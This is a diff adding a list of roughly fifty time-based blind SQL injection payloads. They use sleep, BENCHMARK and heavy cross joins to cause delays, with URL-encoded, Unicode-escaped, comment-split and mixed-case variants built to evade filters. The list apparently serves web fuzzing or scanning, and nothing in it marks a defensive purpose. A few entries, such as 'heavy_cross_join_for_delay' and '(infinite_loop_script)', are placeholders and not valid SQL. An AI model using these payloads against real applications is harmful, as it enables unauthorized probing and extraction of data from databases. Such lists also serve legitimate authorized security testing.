@@ -1,0 +1,49 @@
+' OR sleep(5) --
+'; sleep(5); --
+' aNd SlEeP(5) --
+%27%20OR%20sleep(5)%20--
+%2527%20OR%20sleep(5)%20--
+\u0027 OR sleep(5) --
+'/comment/OR/comment/sleep(5) --
+' OR sleep/* */(5) --
+' OR//sleep(5)// --
+' OR sleep(5)--
+' OR sleep(5)#
+' UNION SELECT sleep(5) --
+' OR 1=(sleep(5)) --
+' OR sleep(5) AND '1'='1
+' OR (SELECT sleep(5)) --
+%27%20AND%20sleep(5)%20--
+' OR IF(1=1,sleep(5),0) --
+' OR BENCHMARK(1000000,MD5(1)) --
+' OR (SELECT COUNT(*) FROM V CROSS JOIN V) --
+\u0027\u0020OR\u0020sleep(5)\u0020--
+' OR sleep(10) --
+' OR sleep(5) /' or sleep(5) or '" or sleep(5) or "/
+' GROUP BY sleep(5) --
+' ORDER BY sleep(5) --
+' HAVING sleep(5) --
+' UNION ALL SELECT sleep(5) --
+%27+OR+sleep(5)+--
+' OR sleep(concat(5)) --
+' OR 1=sleep(5) --
+%2527%20OR%20sleep%285%29%20--
+' OR sleep(5)=0 --
+' AND sleep(5) --
+' AND SLEEP(5) RLIKE SLEEP(5) --
+' PROCEDURE ANALYSE(sleep(5),1) --
+' OR (sleep(5)) IS NULL --
+'; SELECT sleep(5); --
+' OR CAST(sleep(5) AS int) --
+' OR (SELECT COUNT(*) FROM E CROSS JOIN E) --
+' OR REPEAT('a',1000000) --
+' OR generateSeries(1,1000000) --
+' OR RAND() + sleep(5) --
+' OR ExtractValue(1,concat(0x5c,(sleep(5)))) --
+' OR UpdateXML(1,concat(0x5c,(sleep(5))),1) --
+' OR MULTIPOINT((SELECT * FROM (SELECT sleep(5))a)) --
+' OR 1=(SELECT sleep(5) FROM V) --
+' OR heavy_cross_join_for_delay --
+' OR (infinite_loop_script) --
+%27%20OR%20BENCHMARK%281000000%2CMD5%281%29%29%20--
+' OR (SELECT * FROM O CROSS JOIN O LIMIT 100000) --
